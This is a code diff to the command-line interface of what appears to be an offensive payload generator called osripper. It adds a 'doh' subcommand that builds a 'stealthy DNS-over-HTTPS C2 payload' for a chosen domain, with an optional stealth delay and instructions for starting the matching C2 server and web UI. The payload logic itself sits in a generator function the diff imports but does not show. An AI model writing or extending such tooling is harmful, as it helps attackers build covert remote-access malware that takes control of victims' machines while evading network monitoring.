@@ -126,6 +126,14 @@ For detailed help on a specific command, run:
                              help='Callback port (1024-65535)')
     add_common_options(staged_parser)
     
+    # DoH payload
+    doh_parser = subparsers.add_parser('doh', 
+                                       help='Create DNS-over-HTTPS C2 payload',
+                                       description='Create stealthy DNS-over-HTTPS C2 payload with web UI')
+    doh_parser.add_argument('-d', '--domain', required=True,
+                           help='C2 domain name (e.g., example.com)')
+    add_common_options(doh_parser)
+    
     # Interactive mode
     interactive_parser = subparsers.add_parser('interactive', 
                                               help='Interactive mode',
@@ -342,6 +350,29 @@ if __name__ == "__main__":
     
     return True
 
+def execute_doh(args):
+    """Execute DoH payload generation."""
+    from .generator import create_doh_payload
+    
+    if not args.quiet:
+        print(f"[*] Creating DNS-over-HTTPS C2 payload for domain: {args.domain}")
+    
+    # Set global variables
+    main_module.name = args.output
+    
+    # Generate DoH payload
+    create_doh_payload(args.domain, args.output, stealth_delay=args.delay)
+    
+    if not args.quiet:
+        print(f"[+] DoH payload generated: {args.output}")
+        print(f"[*] C2 Domain: {args.domain}")
+        if args.delay:
+            print("[*] Stealth delay enabled (5-15 seconds)")
+        print("[i] Start C2 server with: python -m osripper.c2.server <domain>")
+        print("[i] Web UI will be available at: http://localhost:5000")
+    
+    return True
+
 def post_process(args):
     """Handle post-processing options using centralized Generator."""
     if args.obfuscate or args.compile:
@@ -439,6 +470,8 @@ def main_cli():
         success = execute_custom(args)
     elif args.command == 'staged':
         success = execute_staged(args)
+    elif args.command == 'doh':
+        success = execute_doh(args)
     
     if not success:
         print("[!] Operation failed")
@@ -447,8 +480,9 @@ def main_cli():
     # Post-processing
     post_process(args)
     
-    # Start listener if needed
-    start_listener_if_needed(args)
+    # Start listener if needed (skip for DoH)
+    if args.command != 'doh':
+        start_listener_if_needed(args)
     
     if not args.quiet:
         print("\n[+] Operation completed successfully!")
